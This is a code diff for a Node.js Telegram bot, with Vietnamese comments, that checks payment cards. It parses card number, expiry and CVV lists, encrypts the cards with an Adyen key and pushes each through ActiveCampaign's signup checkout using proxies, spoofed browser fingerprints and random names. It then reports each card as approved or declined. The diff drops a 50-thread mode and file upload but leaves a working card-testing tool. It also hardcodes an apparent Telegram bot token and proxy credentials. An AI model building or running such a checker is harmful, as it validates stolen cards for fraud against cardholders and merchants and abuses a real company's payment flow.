@@ -3,13 +3,13 @@ const fs = require('fs');
 const { execSync } = require('child_process');
 const crypto = require('crypto');
 const TelegramBot = require('node-telegram-bot-api');
-const request = require('request'); // Cần thêm thư viện này để tải file (npm install request)
 
 // ==========================================
 // 1. CẤU HÌNH & DATA
 // ==========================================
 
 // --- CẤU HÌNH TELEGRAM ---
+// Thay token của bạn vào đây
 const TELEGRAM_TOKEN = '8414556300:AAGs-pW76xOmEzi-SbLcHDaUOiUXtYpBq_0'; 
 
 // Khởi tạo Bot
@@ -23,9 +23,6 @@ const PROXY_PASS = "AetOKcLB";
 
 // Chuỗi proxy định dạng HTTP
 const proxyUrl = `http://${PROXY_USER}:${PROXY_PASS}@${PROXY_HOST}:${PROXY_PORT}`;
-
-// Cấu hình luồng chạy
-const CONCURRENCY_LIMIT = 50; // 50 luồng
 
 // Adyen Key
 const ADYEN_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F";
@@ -317,6 +314,7 @@ function getRandomName() {
     return `${first} ${last}`;
 }
 
+// Hàm Luhn Check (được giữ lại và tối ưu theo yêu cầu)
 function validateLuhn(cardNumber) {
     const cardNum = cardNumber.replace(/\D/g, '');
     if (!cardNum || cardNum.length < 13 || cardNum.length > 19) return false;
@@ -333,7 +331,11 @@ function validateLuhn(cardNumber) {
     return total % 10 === 0;
 }
 
+// --- NEW CODE INTEGRATION (Converted from Python to JS) ---
+
+// Thay thế hàm normalizeCard cũ bằng logic mới chặt chẽ hơn
 function normalizeCard(cardStr) {
+    // Regex tương đương: r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
     const pattern = /(\d{13,19})[\s|\/;:.-]+(\d{1,2})[\s|\/;:.-]+(\d{2,4})[\s|\/;:.-]+(\d{3,4})/;
     const match = cardStr.match(pattern);
     
@@ -341,28 +343,35 @@ function normalizeCard(cardStr) {
     
     let [_, cardNum, month, year, cvv] = match;
     
+    // Validate Month
     const monthInt = parseInt(month, 10);
     if (isNaN(monthInt) || monthInt < 1 || monthInt > 12) return null;
     
+    // Validate Year
     if (year.length === 2) year = '20' + year;
     const yearInt = parseInt(year, 10);
-    if (isNaN(yearInt) || yearInt > 2040) return null; 
+    if (isNaN(yearInt) || yearInt > 2040) return null; // Logic mới: giới hạn năm 2040
     
     month = month.padStart(2, '0');
     
     return { cc: cardNum, mm: month, yy: year, cvv: cvv, raw: `${cardNum}|${month}|${year}|${cvv}` };
 }
 
+// Hàm trích xuất nhiều thẻ từ văn bản (Multiline support)
 function extractCardsFromText(text) {
     if (!text) return [];
     const validCards = [];
     const seen = new Set();
+    
+    // Tách dòng
     const lines = text.split(/\r?\n/);
+    // Regex tìm kiếm trong từng dòng
     const patternStrict = /(\d{13,19})[\s|\/;:.-]+(\d{1,2})[\s|\/;:.-]+(\d{2,4})[\s|\/;:.-]+(\d{3,4})/g;
 
     for (const line of lines) {
         const matches = [...line.matchAll(patternStrict)];
         for (const m of matches) {
+            // m[1]=cc, m[2]=mm, m[3]=yy, m[4]=cvv
             const tempStr = `${m[1]}|${m[2]}|${m[3]}|${m[4]}`;
             const normalized = normalizeCard(tempStr);
             
@@ -405,7 +414,9 @@ function updateCookies(currentCookies, responseHeaders) {
     return cookieList.join('; ');
 }
 
+// Hàm mã hóa hỗ trợ tạo file tạm ngẫu nhiên để tránh xung đột khi chạy Bot nhiều luồng
 function getEncryptedData(cardData) {
+    // Tạo tên file ngẫu nhiên: temp_enc_TIMESTAMP_RANDOM.py
     const randomSuffix = crypto.randomBytes(4).toString('hex');
     const tempFileName = `temp_enc_${Date.now()}_${randomSuffix}.py`;
     
@@ -424,21 +435,22 @@ function getEncryptedData(cardData) {
 }
 
 // ==========================================
-// 3. CORE LOGIC (Đã sửa đổi để trả về kết quả thay vì gửi tin nhắn trực tiếp)
+// 3. CORE LOGIC (Xử lý từng thẻ)
 // ==========================================
 
-async function checkCardActiveCampaign(cardInfo) {
-    // Trả về object kết quả: { status: 'LIVE'/'DIE'/'ERROR', message: string, raw: string }
-    
+async function checkCardActiveCampaign(chatId, cardInfo) {
     const brandName = getShortBrandName(cardInfo.cc);
-    
+    await bot.sendMessage(chatId, `🚀 Đang kiểm tra: ${cardInfo.raw}\nBrand: ${brandName}\nVui lòng đợi...`);
+
+    // Mã hóa dữ liệu
     let encryptedPayload = null;
     try {
         encryptedPayload = getEncryptedData(cardInfo);
     } catch (e) {
-        return { status: 'ERROR', message: `❌ Lỗi mã hóa: ${e.message}`, raw: cardInfo.raw };
+        return `❌ Lỗi mã hóa (Python): ${e.message}`;
     }
 
+    // Generate Dynamic Data
     const browserData = getBrowserFingerprint();
     const randomUA = browserData.ua;
     const currentSecChUa = browserData.secChUa;
@@ -447,10 +459,12 @@ async function checkCardActiveCampaign(cardInfo) {
     const randomName = getRandomName();
     const dynamicAttemptId = generateCheckoutAttemptId();
     
+    // Khởi tạo cycle mới cho mỗi lần check để đảm bảo sạch sẽ cookie
     const cycle = await initCycleTLS();
     let currentCookies = "";
     let csrfToken = "";
-    
+    let finalResult = "";
+
     try {
         // --- REQUEST 1: GET Signup ---
         const url1 = 'https://www.activecampaign.com/signup/?code=ac&tier=enterprise&contacts=1000&currency=USD';
@@ -524,7 +538,7 @@ async function checkCardActiveCampaign(cardInfo) {
         csrfToken = data2?.token;
         if (!csrfToken) {
             cycle.exit();
-            return { status: 'ERROR', message: "❌ Lỗi: Không lấy được CSRF Token.", raw: cardInfo.raw };
+            return "❌ Lỗi: Không lấy được CSRF Token.";
         }
 
         // --- REQUEST 3: POST Payment Methods ---
@@ -624,271 +638,91 @@ async function checkCardActiveCampaign(cardInfo) {
                 }
 
                 const additionalData = data.additionalData || {};
+                const cvcResultRaw = additionalData.cvcResultRaw || 'N/A';
                 const cvcResult = additionalData.cvcResult || 'N/A';
+                const avsResultRaw = additionalData.avsResultRaw || 'N/A';
                 const avsResult = additionalData.avsResult || 'N/A';
                 const refusalReasonRaw = additionalData.refusalReasonRaw || 'N/A';
+                const refusalReason = data.refusalReason || additionalData.refusalReason || 'N/A';
                 const resultCode = data.resultCode || additionalData.resultCode || 'N/A';
 
-                let msg = "";
-                let status = "DIE";
+                let msg = `UNK - ${data.message || resultCode}`;
+                let icon = "🔴";
 
                 if (resultCode === "Authorised") {
-                    status = "LIVE";
-                    msg = `✅ <b>APPROVED - Card Auth Successfully</b>\n` +
-                          `💳 ${cardInfo.cc}|${cardInfo.mm}|${cardInfo.yy}|${cardInfo.cvv}\n` +
-                          `📝 Code: ${resultCode}\n` +
-                          `🔎 CVC: ${cvcResult} | AVS: ${avsResult}`;
+                    icon = "✅";
+                    msg = "APPROVED - Card Auth Successfully";
                 } else if (resultCode === "Refused") {
-                    status = "DIE";
-                    msg = `❌ <b>DIE - ${refusalReasonRaw}</b>\n` +
-                          `💳 ${cardInfo.cc}|${cardInfo.mm}|${cardInfo.yy}|${cardInfo.cvv}\n` +
-                          `📝 Code: ${resultCode}`;
+                    icon = "❌";
+                    msg = `DIE - ${refusalReason}`;
                 } else if (["IdentifyShopper", "ChallengeShopper", "RedirectShopper"].includes(resultCode)) {
-                    status = "DIE"; // Hoặc có thể coi là Unknown
-                    msg = `⚠️ <b>3DS - 3D Secure required</b>\n` +
-                          `💳 ${cardInfo.cc}|${cardInfo.mm}|${cardInfo.yy}|${cardInfo.cvv}`;
-                } else {
-                    status = "DIE";
-                    msg = `🔴 <b>UNK - ${data.message || resultCode}</b>\n` +
-                          `💳 ${cardInfo.cc}|${cardInfo.mm}|${cardInfo.yy}|${cardInfo.cvv}`;
+                    icon = "⚠️";
+                    msg = "3DS - 3D Secure required";
                 }
 
-                return { status: status, message: msg, raw: cardInfo.raw };
+                finalResult = `${icon} <b>${msg}</b>\n` +
+                              `💳 ${cardInfo.cc}|${cardInfo.mm}|${cardInfo.yy}|${cardInfo.cvv}\n` +
+                              `📝 Code: ${resultCode}\n` +
+                              `ℹ️ Reason: ${refusalReasonRaw}\n` +
+                              `🔎 CVC: ${cvcResult} | AVS: ${avsResult}`;
 
             } catch (parseErr) {
-                 return { status: 'ERROR', message: `❌ Lỗi xử lý Response 4: ${parseErr.message}`, raw: cardInfo.raw };
+                finalResult = `❌ Lỗi xử lý Response 4: ${parseErr.message}`;
             }
         
         } else {
-            return { status: 'ERROR', message: `❌ Request 3 failed (${response3.status})`, raw: cardInfo.raw };
+            finalResult = `❌ Request 3 failed (${response3.status})`;
         }
 
     } catch (error) {
-        return { status: 'ERROR', message: `❌ Lỗi chương trình: ${error.message}`, raw: cardInfo.raw };
+        finalResult = `❌ Lỗi chương trình: ${error.message}`;
     } finally {
-        cycle.exit(); 
+        cycle.exit(); // Quan trọng: Thoát cycle để giải phóng tài nguyên
+        return finalResult;
     }
 }
 
 // ==========================================
-// 4. BỘ ĐIỀU KHIỂN HÀNG ĐỢI & HIỂN THỊ
-// ==========================================
-
-// Hàm chạy hàng đợi với giới hạn 50 luồng
-async function processQueue(chatId, cardList, sourceName) {
-    const total = cardList.length;
-    let stats = {
-        live: 0,
-        die: 0,
-        error: 0,
-        processed: 0,
-        total: total
-    };
-
-    // Gửi tin nhắn khởi tạo
-    let messageText = `⚡️ <b>Task Started: ${sourceName}</b>\n` +
-                      `━━━━━━━━━━━━━━━━━━\n` +
-                      `✅ Live: 0\n` +
-                      `❌ Die: 0\n` +
-                      `⚠️ Error: 0\n` +
-                      `🔄 Remaining: ${total}\n` +
-                      `━━━━━━━━━━━━━━━━━━\n` +
-                      `🚀 Processing with ${CONCURRENCY_LIMIT} threads...`;
-    
-    const sentMsg = await bot.sendMessage(chatId, messageText, { parse_mode: 'HTML' });
-    const messageId = sentMsg.message_id;
-
-    // Cập nhật tin nhắn mỗi 3 giây
-    const updateInterval = setInterval(() => {
-        if (stats.processed < total) {
-            const newText = `⚡️ <b>Task Running: ${sourceName}</b>\n` +
-                            `━━━━━━━━━━━━━━━━━━\n` +
-                            `✅ Live: ${stats.live}\n` +
-                            `❌ Die: ${stats.die}\n` +
-                            `⚠️ Error: ${stats.error}\n` +
-                            `🔄 Remaining: ${total - stats.processed}\n` +
-                            `━━━━━━━━━━━━━━━━━━\n` +
-                            `🚀 Threads: ${CONCURRENCY_LIMIT}`;
-            bot.editMessageText(newText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }).catch(() => {});
-        }
-    }, 3000);
-
-    // Xử lý song song với giới hạn
-    const executing = [];
-    
-    for (const card of cardList) {
-        // Tạo promise cho mỗi thẻ
-        const p = checkCardActiveCampaign(card).then(async (result) => {
-            // Cập nhật stats
-            if (result.status === 'LIVE') {
-                stats.live++;
-                // Gửi ngay thẻ live
-                await bot.sendMessage(chatId, result.message, { parse_mode: 'HTML' });
-            } else if (result.status === 'DIE') {
-                stats.die++;
-            } else {
-                stats.error++;
-            }
-            stats.processed++;
-        });
-
-        executing.push(p);
-
-        // Nếu số lượng đang chạy >= giới hạn, chờ 1 cái xong
-        if (executing.length >= CONCURRENCY_LIMIT) {
-            await Promise.race(executing);
-        }
-        
-        // Xóa các promise đã hoàn thành khỏi mảng executing
-        // (Cách đơn giản để quản lý bộ nhớ, dù Promise.race không remove)
-        // Trong Nodejs thực tế, ta cần logic kỹ hơn, ở đây ta dùng logic đơn giản:
-        // Chờ Promise.race xong thì mảng executing vẫn giữ full, ta phải remove cái đã done.
-        // Cách tốt nhất là gán callback `.then` để tự remove chính nó khỏi mảng.
-    }
-    
-    // Logic queue chuẩn xác hơn để đảm bảo luôn full 50 luồng:
-    /*
-    Để code gọn trong 1 file như yêu cầu, ta dùng logic đệ quy hoặc Promise pool đơn giản bên dưới thay cho vòng lặp trên.
-    */
-}
-
-// Hàm chạy lại Queue tối ưu hơn
-async function processQueueOptimized(chatId, cardList, sourceName) {
-    const total = cardList.length;
-    let stats = { live: 0, die: 0, error: 0, processed: 0, total: total };
-
-    // Init Message
-    let messageText = `⚡️ <b>Task Started: ${sourceName}</b>\n` +
-                      `━━━━━━━━━━━━━━━━━━\n` +
-                      `✅ Live: 0\n` +
-                      `❌ Die: 0\n` +
-                      `⚠️ Error: 0\n` +
-                      `🔄 Remaining: ${total}\n` +
-                      `━━━━━━━━━━━━━━━━━━\n` +
-                      `🚀 Threads: ${CONCURRENCY_LIMIT}`;
-    
-    const sentMsg = await bot.sendMessage(chatId, messageText, { parse_mode: 'HTML' });
-    const messageId = sentMsg.message_id;
-
-    // Update Interval
-    const updateInterval = setInterval(() => {
-        const newText = `⚡️ <b>Task Running: ${sourceName}</b>\n` +
-                        `━━━━━━━━━━━━━━━━━━\n` +
-                        `✅ Live: ${stats.live}\n` +
-                        `❌ Die: ${stats.die}\n` +
-                        `⚠️ Error: ${stats.error}\n` +
-                        `🔄 Remaining: ${total - stats.processed}\n` +
-                        `━━━━━━━━━━━━━━━━━━\n` +
-                        `🚀 Threads: ${CONCURRENCY_LIMIT}`;
-        bot.editMessageText(newText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }).catch(() => {});
-    }, 2500);
-
-    // Pool Logic
-    let index = 0;
-    const next = () => {
-        if (index >= total) return null;
-        const card = cardList[index++];
-        
-        return checkCardActiveCampaign(card).then(async (result) => {
-            if (result.status === 'LIVE') {
-                stats.live++;
-                await bot.sendMessage(chatId, result.message, { parse_mode: 'HTML' });
-            } else if (result.status === 'DIE') stats.die++;
-            else stats.error++;
-            
-            stats.processed++;
-        });
-    };
-
-    // Khởi động pool
-    const workers = [];
-    for (let i = 0; i < CONCURRENCY_LIMIT; i++) {
-        workers.push(
-            (async () => {
-                let p;
-                while ((p = next()) !== null) {
-                    await p;
-                }
-            })()
-        );
-    }
-
-    await Promise.all(workers);
-
-    // Hoàn tất
-    clearInterval(updateInterval);
-    const finalText = `🏁 <b>Task Finished: ${sourceName}</b>\n` +
-                      `━━━━━━━━━━━━━━━━━━\n` +
-                      `✅ Live: ${stats.live}\n` +
-                      `❌ Die: ${stats.die}\n` +
-                      `⚠️ Error: ${stats.error}\n` +
-                      `🔢 Total: ${total}\n` +
-                      `━━━━━━━━━━━━━━━━━━`;
-    await bot.editMessageText(finalText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' });
-    await bot.sendMessage(chatId, "✅ Đã kiểm tra xong toàn bộ danh sách!");
-}
-
-// ==========================================
-// 5. TELEGRAM BOT LISTENER
+// 4. TELEGRAM BOT LISTENER
 // ==========================================
 
 console.log("=== TELEGRAM BOT STARTED ===");
 
-// 5.1 Xử lý lệnh /st (Text)
+// Lắng nghe lệnh /st (Hỗ trợ Multiline / List)
 bot.onText(/\/st([\s\S]*)/, async (msg, match) => {
     const chatId = msg.chat.id;
-    const input = match[1]; 
+    const input = match[1]; // Lấy toàn bộ nội dung sau /st
+
+    // 1. Trích xuất thẻ bằng hàm mới (tương tự Python logic bạn gửi)
     const cards = extractCardsFromText(input);
 
     if (cards.length === 0) {
-        return bot.sendMessage(chatId, "⚠️ Không tìm thấy thẻ hợp lệ!\nFormat: `/st cc|mm|yy|cvv`", { parse_mode: 'Markdown' });
+        return bot.sendMessage(chatId, "⚠️ Không tìm thấy thẻ hợp lệ!\nVui lòng nhập: `/st cc|mm|yy|cvv` (hoặc list)", { parse_mode: 'Markdown' });
     }
 
-    // Luhn Filter
-    const validCards = cards.filter(c => validateLuhn(c.cc));
+    // Thông báo số lượng tìm thấy
+    await bot.sendMessage(chatId, `🔍 Tìm thấy ${cards.length} thẻ hợp lệ. Bắt đầu kiểm tra...`);
+
+    // 2. Duyệt qua từng thẻ và xử lý
+    for (const card of cards) {
+        // Luhn Check (được tích hợp sẵn trong flow)
+        if (!validateLuhn(card.cc)) {
+            await bot.sendMessage(chatId, `⚠️ Bỏ qua thẻ lỗi Luhn: ${card.cc}`);
+            continue;
+        }
+
+        // Gọi hàm xử lý (Async)
+        try {
+            const resultMsg = await checkCardActiveCampaign(chatId, card);
+            // 3. Gửi kết quả
+            await bot.sendMessage(chatId, resultMsg, { parse_mode: 'HTML' });
+        } catch (err) {
+            await bot.sendMessage(chatId, `❌ CRITICAL ERROR (${card.cc}): ${err.message}`);
+        }
+    }
     
-    if (validCards.length === 0) {
-        return bot.sendMessage(chatId, "⚠️ Tất cả thẻ đều lỗi Luhn (sai định dạng số).");
-    }
-
-    await processQueueOptimized(chatId, validCards, "TEXT INPUT");
+    await bot.sendMessage(chatId, "🏁 Đã kiểm tra xong danh sách!");
 });
 
-// 5.2 Xử lý FILE (.txt)
-bot.on('document', async (msg) => {
-    const chatId = msg.chat.id;
-    const fileId = msg.document.file_id;
-    const fileName = msg.document.file_name;
-
-    if (!fileName.endsWith('.txt')) {
-        return bot.sendMessage(chatId, "⚠️ Chỉ chấp nhận file .txt");
-    }
-
-    await bot.sendMessage(chatId, `📥 Đang tải file ${fileName}...`);
-
-    try {
-        const fileLink = await bot.getFileLink(fileId);
-        
-        request.get(fileLink, async (error, response, body) => {
-            if (error || response.statusCode !== 200) {
-                return bot.sendMessage(chatId, "❌ Lỗi tải file.");
-            }
-
-            const cards = extractCardsFromText(body);
-            const validCards = cards.filter(c => validateLuhn(c.cc));
-
-            if (validCards.length === 0) {
-                return bot.sendMessage(chatId, "⚠️ File không chứa thẻ hợp lệ hoặc lỗi Luhn.");
-            }
-
-            await bot.sendMessage(chatId, `🔍 Tìm thấy ${validCards.length} thẻ hợp lệ từ file. Bắt đầu chạy 50 luồng...`);
-            await processQueueOptimized(chatId, validCards, fileName);
-        });
-
-    } catch (err) {
-        bot.sendMessage(chatId, `❌ Lỗi xử lý file: ${err.message}`);
-    }
-});
-
-// Xử lý lỗi polling
+// Xử lý lỗi polling (để bot không crash)
 bot.on("polling_error", (err) => console.log(err));
